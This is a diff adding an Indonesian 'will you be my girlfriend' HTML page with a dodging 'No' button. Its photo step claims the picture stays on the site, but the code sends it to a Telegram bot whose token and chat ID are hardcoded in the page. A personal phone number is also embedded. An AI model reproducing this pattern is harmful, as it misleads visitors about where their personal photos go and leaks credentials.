@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Untuk Kamu 🤍</title>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial;
+    background: repeating-linear-gradient(
+        45deg,
+        #ff8fa3,
+        #ff8fa3 10px,
+        #fff 10px,
+        #fff 20px
+    );
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.card{
+    background:white;
+    width:300px;
+    padding:20px;
+    border-radius:15px;
+    text-align:center;
+    box-shadow:0 10px 25px rgba(0,0,0,0.2);
+}
+
+button{
+    padding:8px 15px;
+    border:none;
+    border-radius:20px;
+    background:#ff4d6d;
+    color:white;
+    cursor:pointer;
+    margin-top:10px;
+}
+
+.hidden{display:none;}
+</style>
+</head>
+<body>
+
+<audio id="bgm" loop>
+    <source src="lagu.mp3" type="audio/mp3">
+</audio>
+
+<div class="card">
+
+<div id="slide1">
+    <h2>Hai Kamu 🤍</h2>
+    <p>Aku mau ngomong sesuatu...</p>
+    <button onclick="next(1)">Next →</button>
+</div>
+
+<div id="slide2" class="hidden">
+    <h2>Kamu itu spesial banget 💕</h2>
+    <button onclick="next(2)">Next →</button>
+</div>
+
+<div id="slide3" class="hidden">
+    <h2>Kirim pap Kamu 🤍</h2>
+    <p>Foto akan jadi kenangan di web ini 💌</p>
+    <input type="file" id="photo"><br>
+    <button onclick="sendPhoto()">Kirim 🤍</button>
+</div>
+
+<div id="slide4" class="hidden">
+    <h2>Kamu Mau Jadi Pacarku? 💍</h2>
+    <button onclick="yes()">Mau 🤍</button>
+    <button id="noBtn" onmouseover="moveBtn()">Enggak 😝</button>
+    <p id="result"></p>
+</div>
+
+</div>
+
+<script>
+
+const TOKEN = "8759611428:AAFKnNgCCCzD2nCBY4yjkkYJcdll4shAvW0";
+const CHAT_ID = "7938270366";
+
+function next(num){
+    document.getElementById("slide"+num).classList.add("hidden");
+    document.getElementById("slide"+(num+1)).classList.remove("hidden");
+}
+
+function moveBtn(){
+    let btn = document.getElementById("noBtn");
+    btn.style.position="absolute";
+    btn.style.top=Math.random()*300+"px";
+    btn.style.left=Math.random()*300+"px";
+}
+
+function yes(){
+    let nomor = "6283873778838"; // GANTI NOMOR KAMU
+    let pesan = "aku mau jadi pacar muu 🤍";
+    let url = "https://wa.me/" + nomor + "?text=" + encodeURIComponent(pesan);
+    window.location.href = url;
+}
+
+function sendPhoto(){
+    let file = document.getElementById("photo").files[0];
+    if(!file){
+        alert("Pilih foto dulu 🤍");
+        return;
+    }
+
+    let formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", file);
+
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+        alert("Foto terkirim 🤍");
+        next(3);
+    })
+    .catch(err => {
+        alert("Gagal kirim 😢");
+    });
+}
+
+</script>
+
+</body>
+</html>
